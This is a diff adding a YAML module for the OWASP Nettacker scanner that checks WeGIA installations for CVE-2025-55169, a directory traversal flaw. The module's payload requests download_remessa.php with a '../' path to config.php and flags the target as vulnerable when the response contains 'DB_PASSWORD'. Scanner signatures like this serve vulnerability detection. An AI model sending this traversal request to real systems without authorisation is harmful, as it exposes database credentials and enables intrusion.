@@ -1,0 +1,54 @@
+info:
+  name: wegia_cve_2025_55169_vuln
+  author: OWASP Nettacker Team
+  severity: 10
+  description: |
+    WeGIA versions prior to 3.4.8 are vulnerable to a directory traversal
+    vulnerability in the download_remessa.php endpoint, allowing unauthenticated
+    attackers to read arbitrary files such as config.php which contains
+    sensitive database credentials.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-55169
+    - https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-mm3p-7573-4x4j
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve2025
+    - cve
+    - wegia
+    - lfi
+    - path_traversal
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Host: "{target}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/html/socio/sistema/download_remessa.php?file=../../../www/html/wegia/config.php"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "DB_PASSWORD"
+              reverse: false
